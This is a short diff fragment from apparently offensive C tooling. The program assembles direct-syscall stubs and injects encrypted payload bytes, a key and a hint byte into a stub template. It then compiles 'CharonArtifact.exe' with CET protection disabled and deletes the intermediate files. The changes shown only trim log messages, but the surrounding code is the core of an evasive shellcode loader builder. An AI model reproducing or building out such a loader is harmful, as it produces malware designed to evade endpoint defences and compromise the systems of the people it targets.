   printf("[*] Assembling (ML64)...\n");
   if (system("ml64 /c /Cx /nologo syscalls.asm") != 0) {
-    printf("[!] Assembly failed. Ensure MSVC/ML64 is in PATH.\n");
+    printf("[!] Assembly failed.\n");
     return 1;
   }
 
   // 5. Generate C Source
-  printf("[*] Generating Monolithic C source (artifact.c)...\n");
+  printf("[*] Generating artifact.c...\n");
   char *step1 = ReplacePattern(g_StubTemplate, "{{HINT_BYTE}}", sHint);
   char *step2 = ReplacePattern(step1, "{{PAYLOAD_BYTES}}", sPayload);
   char *finalSource = ReplacePattern(step2, "{{KEY_BYTES}}", sKey);
@@ -410,7 +478,6 @@ int main(int argc, char *argv[]) {
   int res = system("cl /nologo /O2 artifact.c syscalls.obj /Fe:CharonArtifact.exe /link /CETCOMPAT:NO");
 
   // 7. Cleanup
-  printf("[*] Cleaning up temp files...\n");
   system("del syscalls.asm syscalls.obj artifact.c artifact.obj >NUL 2>&1");
   free(step1); free(step2); free(finalSource); free(sPayload); free(sKey); free(shellcode);
 
